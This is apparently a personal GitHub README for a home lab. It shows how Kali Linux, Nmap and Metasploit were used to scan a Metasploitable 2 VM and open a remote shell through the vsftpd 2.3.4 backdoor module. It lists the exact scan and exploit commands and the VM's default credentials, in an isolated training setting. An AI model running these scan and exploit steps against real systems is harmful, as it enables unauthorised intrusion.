# cybersecurity-lab-nmap-metasploit
Hands-on cybersecurity lab using Kali Linux and Metasploitable to scan and exploit vulnerabilities with Nmap and Metasploit.

# 🔐 Cybersecurity Home Lab: Nmap Scan & Exploitation

## 🧰 Tools Used
- VirtualBox
- Kali Linux (Attacker VM)
- Metasploitable 2 (Vulnerable Target VM)
- Nmap (Port scanning & service enumeration)
- Metasploit Framework (Exploitation)

---

## 🛠️ Lab Setup

This lab was built using VirtualBox to simulate a safe, isolated network environment for practicing offensive security techniques.

### 🔧 Network Configuration
Both Kali Linux and Metasploitable 2 are configured to use a **Host-Only Adapter** to ensure full isolation from the internet.

### 🔐 Metasploitable Login

Username: msfadmin
Password: msfadmin

After identifying the IP of the Metasploitable VM using ifconfig, I performed a vulnerability scan using Nmap:

nmap -sS -sV -O 192.168.56.101

✅ Flag Breakdown:
	•	-sS : TCP SYN scan (stealthy and fast)
	•	-sV : Detects service versions
	•	-O  : Tries to determine the operating system

🧾 Sample Output:
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8
...

💥 Step 2: Exploitation with Metasploit

Identified a vulnerable FTP service running vsftpd 2.3.4. Used Metasploit to exploit it and gain shell access:

msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
exploit

✅ Result: Opened a remote shell session with the target.

🧠 What I Learned
	•	How to configure and isolate VMs in a virtual network
	•	How to scan and enumerate services using Nmap
	•	How to identify vulnerabilities based on service versions
	•	Basic exploitation using the Metasploit Framework
	•	The importance of safe, offline testing environments

🚀 Future Improvements
	•	Add Wireshark for packet sniffing and traffic analysis
	•	Expand lab with Security Onion or Splunk for detection & logging
	•	Build custom scripts to automate scanning/reporting

🔗 Connect with Me

👨‍💻 Robert Tolbert
🎯 Passionate about cybersecurity, software engineering, and aviation!

